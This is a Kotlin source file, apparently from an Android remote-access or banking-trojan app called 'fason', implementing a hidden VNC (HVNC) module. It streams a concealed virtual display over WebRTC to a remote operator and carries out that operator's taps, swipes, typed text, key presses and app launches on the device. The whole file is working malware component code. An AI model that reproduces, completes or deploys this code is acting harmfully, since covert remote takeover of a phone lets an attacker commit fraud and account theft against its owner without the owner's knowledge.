package com.fason.app.features.hvnc

import android.graphics.Bitmap
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.fason.app.core.FasonApp
import com.fason.app.core.Protocol
import com.fason.app.core.network.SocketClient
import org.json.JSONArray
import org.json.JSONObject
import org.webrtc.DataChannel
import org.webrtc.DefaultVideoDecoderFactory
import org.webrtc.DefaultVideoEncoderFactory
import org.webrtc.EglBase
import org.webrtc.IceCandidate
import org.webrtc.MediaConstraints
import org.webrtc.MediaStream
import org.webrtc.PeerConnection
import org.webrtc.PeerConnectionFactory
import org.webrtc.RtpParameters
import org.webrtc.RtpReceiver
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import org.webrtc.JavaI420Buffer
import org.webrtc.NV21Buffer
import org.webrtc.VideoFrame
import org.webrtc.VideoSource
import org.webrtc.VideoTrack
import java.nio.ByteBuffer
import java.nio.charset.StandardCharsets
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.math.max
import kotlin.math.min

/**
 * Manages the WebRTC peer connection for the HVNC hidden virtual display.
 *
 * Completely independent from WebRtcScreenManager — uses its own PeerConnectionFactory,
 * video source, and signaling channels (HVNC_OFFER/HVNC_ANSWER/HVNC_ICE).
 *
 * Frames are captured from HvncDisplayManager's ImageReader and pushed into
 * a WebRTC VideoSource via manual VideoFrame injection.
 */
object HvncWebRtcManager {

    private const val TAG = "HvncWebRtc"
    private const val FPS = 30
    private const val MIN_BITRATE_BPS = 300_000
    private const val START_BITRATE_BPS = 1_500_000
    private const val MAX_BITRATE_BPS = 8_000_000
    private const val MAX_PENDING_ICE = 256
    private const val MAX_CONTROL_MSG_BYTES = 64 * 1024
    private const val FRAME_INTERVAL_NS = 1_000_000_000L / FPS

    private val thread = HandlerThread("fason-hvnc-rtc").apply { start() }
    private val handler = Handler(thread.looper)
    private val factoryInitialized = AtomicBoolean(false)

    private var eglBase: EglBase? = null
    private var factory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var videoSource: VideoSource? = null
    private var videoTrack: VideoTrack? = null
    private var controlChannel: DataChannel? = null

    private var sessionId = ""
    private var pendingOffer: JSONObject? = null
    private val pendingIce = mutableListOf<Pair<String, IceCandidate>>()
    private val remoteDescriptionSet = AtomicBoolean(false)
    private var lastFrameTimeNs = 0L

    /** Reference to the display manager for frame capture. */
    private var displayManager: HvncDisplayManager? = null

    /** Reference to the input injector for control messages. */
    private var inputInjector: HvncInputInjector? = null

    @JvmStatic
    fun attach(display: HvncDisplayManager, injector: HvncInputInjector) {
        handler.post {
            displayManager = display
            inputInjector = injector
            // Wire up the frame listener
            display.frameListener = { reader -> onFrameAvailable(reader) }
        }
    }

    @JvmStatic
    fun handleOffer(data: JSONObject) {
        val copy = JSONObject(data.toString())
        handler.post {
            val incomingSession = copy.optString("sessionId")
            if (incomingSession.isBlank() || copy.optString("sdp").isBlank()) {
                emitError(incomingSession, "Invalid HVNC WebRTC offer")
                return@post
            }
            pendingIce.removeAll { it.first != incomingSession }
            pendingOffer = copy
            if (displayManager?.isActive() == true) createPeerFromPendingOffer()
        }
    }

    @JvmStatic
    fun handleRemoteIce(data: JSONObject) {
        val incomingSession = data.optString("sessionId")
        val candidate = data.optString("candidate")
        if (incomingSession.isBlank() || candidate.isBlank()) return
        val ice = IceCandidate(
            data.optString("sdpMid").ifBlank { null },
            data.optInt("sdpMLineIndex", 0),
            candidate,
        )
        handler.post {
            val pc = peerConnection
            if (pc != null && incomingSession == sessionId && remoteDescriptionSet.get()) {
                pc.addIceCandidate(ice)
            } else {
                if (pendingIce.count { it.first == incomingSession } < MAX_PENDING_ICE) {
                    pendingIce.add(incomingSession to ice)
                }
            }
        }
    }

    @JvmStatic
    fun onDisplayReady() {
        handler.post {
            createPeerFromPendingOffer()
            if (pendingOffer == null && peerConnection == null) emitStatus(true, "ready")
        }
    }

    @JvmStatic
    fun stopSession() {
        handler.post { releaseSession() }
    }

    @JvmStatic
    fun detachPeer(targetSession: String = "") {
        handler.post {
            val pendingSession = pendingOffer?.optString("sessionId").orEmpty()
            if (targetSession.isNotBlank() && targetSession != sessionId && targetSession != pendingSession) return@post
            if (targetSession.isBlank() || targetSession == pendingSession) pendingOffer = null
            releasePeerConnectionOnly()
            sessionId = ""
            remoteDescriptionSet.set(false)
            if (targetSession.isBlank()) pendingIce.clear()
            else pendingIce.removeAll { it.first == targetSession }
            videoTrack?.setEnabled(false)
            emitStatus(displayManager?.isActive() == true, if (displayManager?.isActive() == true) "ready" else "stopped")
        }
    }

    @JvmStatic
    fun emitCurrentStatus() {
        handler.post {
            val displayActive = displayManager?.isActive() == true
            val state = when {
                !displayActive -> "stopped"
                peerConnection == null -> "ready"
                else -> "connecting"
            }
            emitStatus(displayActive, state)
        }
    }

    // ─── Frame capture from ImageReader ────────────────────────────

    private fun onFrameAvailable(reader: ImageReader) {
        val source = videoSource ?: return
        val now = System.nanoTime()
        if (now - lastFrameTimeNs < FRAME_INTERVAL_NS) {
            // Throttle to target FPS
            try { reader.acquireLatestImage()?.close() } catch (_: Exception) {}
            return
        }

        var image: Image? = null
        try {
            image = reader.acquireLatestImage() ?: return
            lastFrameTimeNs = now

            val width = image.width
            val height = image.height
            val planes = image.planes
            if (planes.isEmpty()) return

            val plane = planes[0]
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val buffer = plane.buffer

            // Create I420 buffer from RGBA data
            val i420Buffer = JavaI420Buffer.allocate(width, height)

            // Convert RGBA to I420 (YUV)
            rgbaToI420(buffer, rowStride, pixelStride, width, height, i420Buffer)

            val videoFrame = VideoFrame(i420Buffer, 0, now)
            source.capturerObserver.onFrameCaptured(videoFrame)
            videoFrame.release()
        } catch (e: Exception) {
            Log.w(TAG, "Frame processing error", e)
        } finally {
            try { image?.close() } catch (_: Exception) {}
        }
    }

    private fun rgbaToI420(
        rgba: ByteBuffer,
        rowStride: Int,
        pixelStride: Int,
        width: Int,
        height: Int,
        i420: JavaI420Buffer,
    ) {
        val yBuffer = i420.dataY
        val uBuffer = i420.dataU
        val vBuffer = i420.dataV
        val yStride = i420.strideY
        val uStride = i420.strideU
        val vStride = i420.strideV

        for (y in 0 until height) {
            for (x in 0 until width) {
                val rgbaIndex = y * rowStride + x * pixelStride
                if (rgbaIndex + 2 >= rgba.capacity()) continue

                val r = rgba.get(rgbaIndex).toInt() and 0xFF
                val g = rgba.get(rgbaIndex + 1).toInt() and 0xFF
                val b = rgba.get(rgbaIndex + 2).toInt() and 0xFF

                // BT.601 conversion
                val yVal = ((66 * r + 129 * g + 25 * b + 128) shr 8) + 16
                yBuffer.put(y * yStride + x, yVal.coerceIn(0, 255).toByte())

                if (y % 2 == 0 && x % 2 == 0) {
                    val uVal = ((-38 * r - 74 * g + 112 * b + 128) shr 8) + 128
                    val vVal = ((112 * r - 94 * g - 18 * b + 128) shr 8) + 128
                    uBuffer.put((y / 2) * uStride + (x / 2), uVal.coerceIn(0, 255).toByte())
                    vBuffer.put((y / 2) * vStride + (x / 2), vVal.coerceIn(0, 255).toByte())
                }
            }
        }
    }

    // ─── WebRTC Peer Connection ────────────────────────────────────

    private fun createPeerFromPendingOffer() {
        val offer = pendingOffer ?: return
        val display = displayManager ?: return
        if (!display.isActive()) return

        val incomingSession = offer.optString("sessionId")
        releasePeerConnectionOnly()
        sessionId = incomingSession
        remoteDescriptionSet.set(false)
        ensureFactory()

        val rtcConfig = PeerConnection.RTCConfiguration(
            parseIceServers(offer.optJSONArray("iceServers"))
        ).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
            enableCpuOveruseDetection = true
        }

        val pc = factory?.createPeerConnection(rtcConfig, createPeerObserver(incomingSession))
        if (pc == null) {
            failPeer(incomingSession, "Unable to create HVNC WebRTC peer")
            return
        }
        peerConnection = pc

        try {
            ensureVideoSource(display)
            val track = videoTrack ?: error("HVNC video track unavailable")
            track.setEnabled(true)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start HVNC WebRTC capture", e)
            emitError(sessionId, e.message ?: "HVNC capture failed")
            releaseSession()
            return
        }

        val remoteOffer = SessionDescription(SessionDescription.Type.OFFER, offer.optString("sdp"))
        pc.setRemoteDescription(object : SimpleSdpObserver() {
            override fun onSetSuccess() {
                if (sessionId != incomingSession) return
                val track = videoTrack
                if (track == null) {
                    failPeer(incomingSession, "HVNC video track unavailable")
                    return
                }
                try {
                    pc.addTrack(track, listOf("fason-hvnc"))
                    configureSender()
                } catch (e: Exception) {
                    failPeer(incomingSession, e.message ?: "Unable to attach HVNC track")
                    return
                }
                remoteDescriptionSet.set(true)
                flushPendingIce()
                createAnswer(pc, incomingSession)
            }

            override fun onSetFailure(error: String) {
                if (sessionId == incomingSession) {
                    failPeer(incomingSession, "Unable to apply HVNC offer: $error")
                }
            }
        }, remoteOffer)
        pendingOffer = null
        emitStatus(true, "connecting")
    }

    private fun ensureVideoSource(display: HvncDisplayManager) {
        if (videoSource != null && videoTrack != null) return

        val source = factory!!.createVideoSource(true)
        source.setIsScreencast(true)
        source.adaptOutputFormat(display.displayWidth, display.displayHeight, FPS)
        videoSource = source

        videoTrack = factory!!.createVideoTrack("fason-hvnc-video", source).apply {
            setEnabled(true)
        }
    }

    private fun createAnswer(pc: PeerConnection, peerSession: String) {
        pc.createAnswer(object : SimpleSdpObserver() {
            override fun onCreateSuccess(answer: SessionDescription) {
                if (sessionId != peerSession) return
                pc.setLocalDescription(object : SimpleSdpObserver() {
                    override fun onSetSuccess() {
                        if (sessionId != peerSession) return
                        val payload = JSONObject().apply {
                            put("sessionId", peerSession)
                            put("sdp", answer.description)
                        }
                        SocketClient.getInstance().socket?.emit(Protocol.HVNC_ANSWER, payload)
                    }

                    override fun onSetFailure(error: String) {
                        if (sessionId == peerSession) {
                            failPeer(peerSession, "Unable to apply HVNC answer: $error")
                        }
                    }
                }, answer)
            }

            override fun onCreateFailure(error: String) {
                if (sessionId == peerSession) {
                    failPeer(peerSession, "Unable to create HVNC answer: $error")
                }
            }
        }, MediaConstraints())
    }

    private fun createPeerObserver(peerSession: String) = object : PeerConnection.Observer {
        override fun onSignalingChange(state: PeerConnection.SignalingState) = Unit
        override fun onIceConnectionReceivingChange(receiving: Boolean) = Unit
        override fun onIceGatheringChange(state: PeerConnection.IceGatheringState) = Unit
        override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) = Unit
        override fun onAddStream(stream: MediaStream) = Unit
        override fun onRemoveStream(stream: MediaStream) = Unit
        override fun onRenegotiationNeeded() = Unit
        override fun onAddTrack(receiver: RtpReceiver, streams: Array<out MediaStream>) = Unit

        override fun onIceCandidate(candidate: IceCandidate) {
            if (sessionId != peerSession) return
            val payload = JSONObject().apply {
                put("sessionId", peerSession)
                put("candidate", candidate.sdp)
                put("sdpMid", candidate.sdpMid)
                put("sdpMLineIndex", candidate.sdpMLineIndex)
            }
            SocketClient.getInstance().socket?.emit(Protocol.HVNC_ICE, payload)
        }

        override fun onDataChannel(channel: DataChannel) {
            handler.post {
                if (sessionId == peerSession) bindControlChannel(channel) else channel.dispose()
            }
        }

        override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {
            if (sessionId != peerSession) return
            when (state) {
                PeerConnection.IceConnectionState.CONNECTED,
                PeerConnection.IceConnectionState.COMPLETED -> emitStatus(true, "connected")
                PeerConnection.IceConnectionState.DISCONNECTED -> emitStatus(true, "disconnected")
                PeerConnection.IceConnectionState.FAILED -> {
                    emitError(peerSession, "HVNC ICE connection failed")
                    handler.post {
                        if (sessionId != peerSession) return@post
                        releasePeerConnectionOnly()
                        sessionId = ""
                        videoTrack?.setEnabled(false)
                        emitStatus(true, "ready")
                    }
                }
                else -> Unit
            }
        }
    }

    // ─── Control Channel ───────────────────────────────────────────

    private fun bindControlChannel(channel: DataChannel) {
        try { controlChannel?.unregisterObserver() } catch (_: Exception) {}
        try { controlChannel?.close() } catch (_: Exception) {}
        try { controlChannel?.dispose() } catch (_: Exception) {}
        controlChannel = channel

        channel.registerObserver(object : DataChannel.Observer {
            override fun onBufferedAmountChange(previousAmount: Long) = Unit
            override fun onStateChange() {
                handler.post {
                    if (controlChannel !== channel) return@post
                    if (channel.state() == DataChannel.State.OPEN) sendDisplayInfo()
                }
            }

            override fun onMessage(buffer: DataChannel.Buffer) {
                if (buffer.binary) return
                if (buffer.data.remaining() > MAX_CONTROL_MSG_BYTES) return
                val bytes = ByteArray(buffer.data.remaining())
                buffer.data.get(bytes)
                handleControlMessage(String(bytes, StandardCharsets.UTF_8))
            }
        })
        if (channel.state() == DataChannel.State.OPEN) sendDisplayInfo()
    }

    private fun handleControlMessage(message: String) {
        val injector = inputInjector ?: return
        try {
            val json = JSONObject(message)
            when (json.optString("action")) {
                Protocol.ACTION_TAP -> {
                    val x = json.optDouble("x", Double.NaN)
                    val y = json.optDouble("y", Double.NaN)
                    if (x.isFinite() && y.isFinite()) injector.tap(x.toFloat(), y.toFloat())
                }
                Protocol.ACTION_SWIPE -> {
                    val sx = json.optDouble("startX", Double.NaN)
                    val sy = json.optDouble("startY", Double.NaN)
                    val ex = json.optDouble("endX", Double.NaN)
                    val ey = json.optDouble("endY", Double.NaN)
                    val dur = json.optLong("duration", 300)
                    if (sx.isFinite() && sy.isFinite() && ex.isFinite() && ey.isFinite()) {
                        injector.swipe(sx.toFloat(), sy.toFloat(), ex.toFloat(), ey.toFloat(), dur)
                    }
                }
                Protocol.ACTION_GESTURE -> {
                    val rawPoints = json.optJSONArray("points") ?: return
                    val points = ArrayList<android.graphics.PointF>(minOf(rawPoints.length(), 256))
                    for (i in 0 until minOf(rawPoints.length(), 256)) {
                        val pt = rawPoints.optJSONObject(i) ?: continue
                        val px = pt.optDouble("x", Double.NaN)
                        val py = pt.optDouble("y", Double.NaN)
                        if (px.isFinite() && py.isFinite()) {
                            points.add(android.graphics.PointF(px.toFloat(), py.toFloat()))
                        }
                    }
                    if (points.isNotEmpty()) {
                        injector.gesture(points, json.optLong("duration", 300))
                    }
                }
                Protocol.ACTION_TOUCH_START,
                Protocol.ACTION_TOUCH_MOVE,
                Protocol.ACTION_TOUCH_END -> {
                    // For HVNC, convert continuous touch to tap at end position
                    if (json.optString("action") == Protocol.ACTION_TOUCH_END) {
                        val x = json.optDouble("x", Double.NaN)
                        val y = json.optDouble("y", Double.NaN)
                        if (x.isFinite() && y.isFinite()) injector.tap(x.toFloat(), y.toFloat())
                    }
                }
                Protocol.ACTION_KEY -> injector.keyEvent(json.optString("keyCode"))
                Protocol.ACTION_TEXT -> injector.typeText(json.optString("text"))
                Protocol.ACTION_VOLUME -> injector.adjustVolume(json.optString("direction"))
                Protocol.ACT_LAUNCH_APP -> injector.launchApp(json.optString("packageName"))
                Protocol.ACT_CLOSE_APP -> injector.closeApp(json.optString("packageName"))
                else -> Log.w(TAG, "Unknown HVNC control: ${json.optString("action")}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "HVNC control message error", e)
        }
    }

    private fun sendDisplayInfo() {
        val channel = controlChannel ?: return
        if (channel.state() != DataChannel.State.OPEN) return
        val display = displayManager ?: return
        val payload = JSONObject().apply {
            put("type", "hvnc-info")
            put(Protocol.KEY_VIRTUAL_W, display.displayWidth)
            put(Protocol.KEY_VIRTUAL_H, display.displayHeight)
            put(Protocol.KEY_DISPLAY_ID, display.displayId)
            put(Protocol.KEY_DENSITY_DPI, display.displayDpi)
        }.toString().toByteArray(StandardCharsets.UTF_8)
        channel.send(DataChannel.Buffer(ByteBuffer.wrap(payload), false))
    }

    // ─── Sender Configuration ──────────────────────────────────────

    private fun configureSender() {
        val sender = peerConnection?.senders?.firstOrNull { it.track()?.kind() == "video" } ?: return
        val parameters = sender.parameters
        parameters.degradationPreference = RtpParameters.DegradationPreference.MAINTAIN_RESOLUTION
        val display = displayManager ?: return
        val target = min(MAX_BITRATE_BPS, max(MIN_BITRATE_BPS, display.displayWidth * display.displayHeight * 2))
        parameters.encodings.forEach {
            it.minBitrateBps = MIN_BITRATE_BPS
            it.maxBitrateBps = target
            it.maxFramerate = FPS
            it.scaleResolutionDownBy = 1.0
        }
        if (!sender.setParameters(parameters)) {
            Log.w(TAG, "HVNC sender rejected parameters")
        }
        peerConnection?.setBitrate(MIN_BITRATE_BPS, min(START_BITRATE_BPS, target), target)
    }

    // ─── Factory & Lifecycle ───────────────────────────────────────

    private fun ensureFactory() {
        if (factoryInitialized.compareAndSet(false, true)) {
            PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(FasonApp.getContext())
                    .setEnableInternalTracer(false)
                    .createInitializationOptions(),
            )
        }
        if (eglBase == null) eglBase = EglBase.create()
        if (factory == null) {
            val ctx = eglBase!!.eglBaseContext
            factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(DefaultVideoEncoderFactory(ctx, true, true))
                .setVideoDecoderFactory(DefaultVideoDecoderFactory(ctx))
                .createPeerConnectionFactory()
        }
    }

    private fun releaseSession() {
        emitStatus(false, "stopped")
        releasePeerConnectionOnly()
        releaseVideoSource()
        remoteDescriptionSet.set(false)
        pendingOffer = null
        pendingIce.clear()
        sessionId = ""
    }

    private fun releasePeerConnectionOnly() {
        try { controlChannel?.unregisterObserver() } catch (_: Exception) {}
        try { controlChannel?.close() } catch (_: Exception) {}
        try { controlChannel?.dispose() } catch (_: Exception) {}
        controlChannel = null
        try { peerConnection?.close() } catch (_: Exception) {}
        try { peerConnection?.dispose() } catch (_: Exception) {}
        peerConnection = null
    }

    private fun releaseVideoSource() {
        try { videoTrack?.dispose() } catch (_: Exception) {}
        videoTrack = null
        try { videoSource?.dispose() } catch (_: Exception) {}
        videoSource = null
    }

    private fun failPeer(targetSession: String, message: String) {
        emitError(targetSession, message)
        handler.post {
            if (sessionId != targetSession) return@post
            releasePeerConnectionOnly()
            remoteDescriptionSet.set(false)
            sessionId = ""
            videoTrack?.setEnabled(false)
            emitStatus(displayManager?.isActive() == true, if (displayManager?.isActive() == true) "ready" else "stopped")
        }
    }

    private fun flushPendingIce() {
        val pc = peerConnection ?: return
        val it = pendingIce.iterator()
        while (it.hasNext()) {
            val (candidateSession, candidate) = it.next()
            if (candidateSession == sessionId) {
                pc.addIceCandidate(candidate)
                it.remove()
            }
        }
    }

    private fun parseIceServers(array: JSONArray?): List<PeerConnection.IceServer> {
        val result = mutableListOf<PeerConnection.IceServer>()
        if (array == null) return result
        for (i in 0 until array.length()) {
            val item = array.optJSONObject(i) ?: continue
            val urls = item.opt("urls")
            val urlList = when (urls) {
                is JSONArray -> (0 until urls.length()).mapNotNull { urls.optString(it).takeIf(String::isNotBlank) }
                is String -> listOf(urls).filter(String::isNotBlank)
                else -> emptyList()
            }
            if (urlList.isEmpty()) continue
            val builder = PeerConnection.IceServer.builder(urlList)
            item.optString("username").takeIf(String::isNotBlank)?.let(builder::setUsername)
            item.optString("credential").takeIf(String::isNotBlank)?.let(builder::setPassword)
            result.add(builder.createIceServer())
        }
        return result
    }

    // ─── Status Emission ───────────────────────────────────────────

    private fun emitStatus(active: Boolean, connectionState: String) {
        val display = displayManager
        val status = JSONObject().apply {
            put(Protocol.KEY_TYPE, Protocol.KEY_STATUS)
            put(Protocol.KEY_STREAMING, active)
            put(Protocol.KEY_VIRTUAL_W, display?.displayWidth ?: 0)
            put(Protocol.KEY_VIRTUAL_H, display?.displayHeight ?: 0)
            put(Protocol.KEY_DISPLAY_ID, display?.displayId ?: -1)
            put(Protocol.KEY_DENSITY_DPI, display?.displayDpi ?: 0)
            put("fps", FPS)
            put("transport", "webrtc")
            put("connectionState", connectionState)
            put("sessionId", sessionId)
        }
        SocketClient.getInstance().socket?.emit(Protocol.HVNC, status)
    }

    private fun emitError(targetSession: String, message: String) {
        val error = JSONObject().apply {
            put(Protocol.KEY_TYPE, Protocol.KEY_ERROR)
            put(Protocol.KEY_ERROR, message)
            put("sessionId", targetSession)
        }
        SocketClient.getInstance().socket?.emit(Protocol.HVNC, error)
    }

    private open class SimpleSdpObserver : SdpObserver {
        override fun onCreateSuccess(description: SessionDescription) = Unit
        override fun onSetSuccess() = Unit
        override fun onCreateFailure(error: String) = Unit
        override fun onSetFailure(error: String) = Unit
    }
}
